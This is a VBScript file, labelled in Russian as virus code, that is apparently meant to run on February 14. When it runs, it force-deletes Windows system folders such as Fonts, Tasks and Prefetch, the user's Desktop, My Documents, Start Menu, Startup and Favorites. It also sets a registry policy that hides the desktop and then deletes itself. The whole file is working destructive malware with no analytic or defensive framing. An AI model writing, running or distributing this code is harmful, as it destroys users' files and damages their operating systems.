'            = = = = = =  = > КОД ВИРУСА < = = = = = = = 

'      Объявление переменных(этот абзац не перемещать)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


'     Запускать вирус каждое 14 число Февраля
If Day(Date)<>14 and Month(Date)<>2 Then WScript.quit

' Удаление C:\WINDOWS\Fonts\
str = "C:\WINDOWS\Fonts\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\WINDOWS\Registration\
str = "C:\WINDOWS\Registration\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\WINDOWS\twain_32\
str = "C:\WINDOWS\twain_32\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\WINDOWS\Tasks
str = "C:\WINDOWS\Tasks"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

' Удаление C:\WINDOWS\Prefetch\
str = "C:\WINDOWS\Prefetch\"
If FileSystemObject.fileExists(str) = True Then
FileSystemObject.deletefile str,True
ElseIf FileSystemObject.folderExists(str) = True Then
FileSystemObject.deletefolder str,True
End If

'     Удаление специальных папок
 For Each Folder In Shell.SpecialFolders

' Удаление Рабочего стола
 FileSystemObject.deletefolder Shell.SpecialFolders ("Desktop"),True
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

' Удаление Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' Удаление PrintHood
 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

' Удаление ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' Удаление шрифтов
 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

' Удаление NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

' Удаление Главное меню
 If right(folder,12) = "Главное меню" Then FileSystemObject.deletefolder folder,True

' Удаление SendTo
 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

' Удаление Автозагрузка
 If right(folder,12) = "Автозагрузка" Then FileSystemObject.deletefolder folder,True

' Удаление Избранное
 If right(folder,9) = "Избранное" Then FileSystemObject.deletefolder folder,True

' Удаление Мои документы
 If right(folder,13) = "Мои документы" Then FileSystemObject.deletefolder folder,True

' Удаление Программы
 If right(folder,9) = "Программы" Then FileSystemObject.deletefolder folder,True
 Next

'     Самоликвидироваться
FileSystemObject.deletefile WScript.ScriptFullName, True

